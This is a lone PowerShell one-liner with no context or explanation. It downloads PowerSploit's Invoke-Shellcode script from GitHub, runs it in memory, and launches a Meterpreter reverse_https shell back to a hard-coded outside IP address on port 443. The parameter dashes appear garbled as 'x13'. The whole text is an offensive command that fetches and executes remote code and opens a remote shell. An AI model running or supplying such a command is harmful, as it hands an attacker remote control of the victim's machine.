IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode x13 Payload windows/meterpreter/reverse_https x13 Lhost 198.56.248.117 x13 Lport 443 x13 Force